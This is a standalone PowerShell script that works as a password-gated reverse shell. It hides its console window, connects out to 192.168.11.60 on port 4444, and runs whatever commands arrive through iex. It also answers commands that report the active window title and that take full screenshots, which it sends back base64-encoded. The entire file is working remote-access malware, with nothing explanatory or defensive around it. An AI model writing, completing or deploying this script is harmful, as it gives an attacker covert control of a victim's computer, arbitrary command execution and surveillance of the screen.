$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru

$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

$ip = '192.168.11.60'
$port = 4444
$pass = "biskviti"

try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
    
    # FIXED: Send full AUTH with password
    $authMsg = "AUTH: $pass`n"
    $s.Write($e.GetBytes($authMsg), 0, $authMsg.Length)
    $s.Flush()
    
    # Read response and compare exactly (no regex cleaning)
    [byte[]]$authB = New-Object byte[] 64
    $len = $s.Read($authB, 0, 64)
    
    if ($len -gt 0) {
        $authResp = $e.GetString($authB, 0, $len).Trim()
        if ($authResp -match $pass) {  # Match anywhere in response
            $msg = "`n[+] ACCESS GRANTED`nPS " + $PWD.Path + "> "
            $resp = $e.GetBytes($msg)
            $s.Write($resp, 0, $resp.Length)
        } else {
            $msg = "AUTH FAIL: $authResp`n"
            $s.Write($e.GetBytes($msg), 0, $msg.Length)
            $c.Close(); exit
        }
    }

    while($true) {
        [byte[]]$b = New-Object byte[] 4096
        $i = $s.Read($b, 0, $b.Length)
        if ($i -le 0) { break }
        
        $in = $e.GetString($b, 0, $i).Trim()
        if ($in -eq 'kill' -or $in -eq 'exit') { break }
        
        # Rest of your command handling...
        $out = ""
        if ($in -eq 'screen') {
            $handle = $api::GetForegroundWindow()
            $sb = New-Object System.Text.StringBuilder 256
            $api::GetWindowText($handle, $sb, $sb.Capacity)
            $out = "[WINDOW] " + $sb.ToString() + "`n"
        }
        elseif ($in -eq 'screenshot') {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
                $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
                $g = [Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
                $ms = New-Object IO.MemoryStream
                $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
                $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
                $g.Dispose(); $bmp.Dispose(); $ms.Close()
            } catch { $out = "Error: " + $_.Exception.Message + "`n" }
        }
        else {
            $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
        }
        
        $prompt = "`nPS " + (Get-Location).Path + "> "
        $resp = $e.GetBytes($out + $prompt)
        $s.Write($resp, 0, $resp.Length)
    }
} catch { exit } finally { if ($c) { $c.Close() }; exit }
